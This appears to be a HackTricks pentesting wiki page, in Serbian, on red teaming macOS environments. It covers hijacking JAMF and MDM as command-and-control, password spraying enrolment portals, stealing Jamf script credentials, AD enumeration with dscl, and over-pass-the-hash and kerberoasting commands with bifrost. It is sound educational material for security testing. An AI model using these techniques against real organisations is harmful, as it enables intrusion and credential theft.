# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Zloupotreba MDM-ova

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Ako uspete da **kompromitujete administratorske kredencijale** za pristup management platformi, možete **potencijalno kompromitovati sve računare** distribuiranjem malware-a na uređaje.

Za red teaming u MacOS okruženjima veoma se preporučuje osnovno razumevanje načina rada MDM-ova:


{{#ref}}
macos-mdm/
{{#endref}}

### Korišćenje MDM-a kao C2

MDM ima dozvole za instaliranje, ispitivanje ili uklanjanje profila, instaliranje aplikacija, kreiranje lokalnih administratorskih naloga, postavljanje firmware lozinke, promenu FileVault ključa...

Da biste pokrenuli sopstveni MDM, potreban vam je **CSR potpisan od strane vendora**, što možete pokušati da dobijete putem [**https://mdmcert.download/**](https://mdmcert.download/). Za pokretanje sopstvenog MDM-a za Apple uređaje možete koristiti [**MicroMDM**](https://github.com/micromdm/micromdm).

Međutim, da biste instalirali aplikaciju na upisanom uređaju, i dalje je potrebno da bude potpisana nalogom developera... međutim, prilikom MDM upisa **uređaj dodaje SSL cert MDM-a kao pouzdani CA**, tako da sada možete potpisati bilo šta.<sup>[[4]](#references)</sup>

Da biste upisali uređaj u MDM, potrebno je da instalirate **`mobileconfig`** fajl kao root, što može biti isporučeno putem **pkg** fajla (možete ga kompresovati u zip, a prilikom preuzimanja iz Safarija biće dekompresovan).

**Mythic agent Orthrus** koristi ovu tehniku.

### Zloupotreba JAMF PRO

JAMF može pokretati **custom scripts** (skripte koje je razvio sysadmin), **native payloads** (kreiranje lokalnih naloga, postavljanje EFI lozinke, nadgledanje fajlova/procesa...) i **MDM** (konfiguracije uređaja, certifikati uređaja...).<sup>[[5]](#references)</sup>

#### JAMF self-enrolment

Posetite stranicu kao što je `https://<company-name>.jamfcloud.com/enroll/` da biste proverili da li imaju **omogućen self-enrolment**. Ako je omogućen, može **zatražiti kredencijale za pristup**.

Možete koristiti skriptu [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) za izvođenje password spraying napada.

Pored toga, nakon pronalaženja ispravnih kredencijala možda ćete moći da izvršite brute-force nad drugim korisničkim imenima pomoću sledećeg formulara:

![Zloupotreba JAMF PRO - JAMF self-enrolment: Pored toga, nakon pronalaženja ispravnih kredencijala možda ćete moći da izvršite brute-force nad drugim korisničkim imenima pomoću sledećeg formulara](<../../images/image (107).png>)

#### JAMF autentikacija uređaja

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** binary je sadržao secret za otvaranje keychain-a, koji je u vreme otkrića bio **zajednički** za sve i glasio je: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Pored toga, jamf se **perzistira** kao **LaunchDaemon** u **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Preuzimanje JAMF uređaja

**JSS** (Jamf Software Server) **URL** koji će **`jamf`** koristiti nalazi se u **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ovaj fajl u osnovi sadrži URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Dakle, napadač bi mogao da ubaci zlonamerni paket (`pkg`) koji bi **prepisao ovu datoteku** prilikom instalacije, postavljajući **URL na Mythic C2 listener iz Typhon agenta**, čime bi mogao da zloupotrebi JAMF kao C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Da biste **impersonate komunikaciju** između uređaja i JMF-a, potrebno je da imate:

- **UUID** uređaja: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF keychain** sa lokacije: `/Library/Application\ Support/Jamf/JAMF.keychain`, koji sadrži sertifikat uređaja

Sa ovim informacijama, **kreirajte VM** sa **ukradenim** Hardware **UUID-om** i sa **onemogućenim SIP-om**, ubacite **JAMF keychain**, postavite **hook** na Jamf **agent** i ukradite njegove informacije.

#### Krađa secrets

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Takođe možete nadgledati lokaciju `/Library/Application Support/Jamf/tmp/` zbog **custom scripts** koje administratori mogu želeti da izvrše putem Jamf-a, pošto se one **ovde postavljaju, izvršavaju i uklanjaju**. Ovi scripts **mogu sadržati credentials**.

Međutim, **credentials** se mogu proslediti ovim scripts kao **parameters**, pa bi bilo potrebno da nadgledate `ps aux | grep -i jamf` (čak i bez root privilegija).

Script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) može da osluškuje dodavanje novih fajlova i nove process arguments.

### macOS Remote Access

Takođe, u vezi sa "posebnim" **network** **protocols** sistema **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

U nekim slučajevima ćete otkriti da je **MacOS računar povezan sa AD-om**. U ovom scenariju trebalo bi da pokušate da **enumerate** active directory na način na koji ste navikli. Pronađite **pomoć** na sledećim stranicama:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Neki **lokalni MacOS tool** koji vam takođe može pomoći jeste `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Takođe postoje neki alati pripremljeni za MacOS za automatsku enumeraciju AD-a i rad sa kerberosom:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound je proširenje alata Bloodhound za auditing koje omogućava prikupljanje i ingestovanje odnosa u Active Directory-ju na MacOS hostovima.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost je Objective-C projekat dizajniran za interakciju sa Heimdal krb5 API-jima na macOS-u. Cilj projekta je omogućavanje boljeg security testiranja Kerberosa na macOS uređajima korišćenjem nativnih API-ja, bez zahtevanja bilo kog drugog framework-a ili paketa na targetu.
- [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript for Automation (JXA) alat za enumeraciju Active Directory-ja.

### Informacije o domenu
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Korisnici

Tri tipa MacOS korisnika su:

- **Local Users** — Njima upravlja lokalni OpenDirectory servis i ni na koji način nisu povezani sa Active Directory.
- **Network Users** — Privremeni Active Directory korisnici kojima je potrebna veza sa DC serverom za autentikaciju.
- **Mobile Users** — Active Directory korisnici sa lokalnom rezervnom kopijom svojih akreditiva i datoteka.

Lokalne informacije o korisnicima i grupama čuvaju se u folderu _/var/db/dslocal/nodes/Default._\
Na primer, informacije o korisniku pod imenom _mark_ čuvaju se u _/var/db/dslocal/nodes/Default/users/mark.plist_, a informacije o grupi _admin_ nalaze se u _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Pored korišćenja HasSession i AdminTo edges, **MacHound dodaje tri nova edges** u Bloodhound bazu podataka:<sup>[[2]](#references)</sup>

- **CanSSH** - entitet kojem je dozvoljeno da koristi SSH za pristup hostu
- **CanVNC** - entitet kojem je dozvoljeno da koristi VNC za pristup hostu
- **CanAE** - entitet kojem je dozvoljeno da izvršava AppleEvent skripte na hostu
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Više informacija na [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)<sup>[[3]](#references)[[6]](#references)</sup>

### Computer$ lozinka

Preuzmite lozinke pomoću:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Moguće je pristupiti lozinci **`Computer$`** unutar System keychain-a.

### Over-Pass-The-Hash

Pribavite TGT za određenog korisnika i servis:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Kada se TGT prikupi, moguće ga je inject-ovati u trenutnu sesiju pomoću:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Sa pribavljenim service ticket-ima moguće je pokušati pristupiti share-ovima na drugim računarima:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Pristupanje Keychain-u

Keychain sa velikom verovatnoćom sadrži osetljive informacije koje bi, ako im se pristupi bez generisanja prompta, mogle pomoći u napredovanju red team vežbe:


{{#ref}}
macos-keychain.md
{{#endref}}

## Eksterne usluge

MacOS Red Teaming se razlikuje od uobičajenog Windows Red Teaming-a zato što je **MacOS obično direktno integrisan sa nekoliko eksternih platformi**. Uobičajena konfiguracija MacOS-a podrazumeva pristup računaru pomoću **sinhronizovanih OneLogin kredencijala i pristupanje različitim eksternim uslugama** (kao što su github, aws...) putem OneLogin-a.

## Razne Red Team tehnike

### Safari

Kada se datoteka preuzme u Safariju, ako je to „bezbedna“ datoteka, ona će biti **automatski otvorena**. Na primer, ako **preuzmete zip**, on će biti automatski raspakovan:<sup>[[1]](#references)</sup>

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Reference

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
- [6] [Active Directory Discovery with a Mac - its-a-feature](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)


{{#include ../../banners/hacktricks-training.md}}
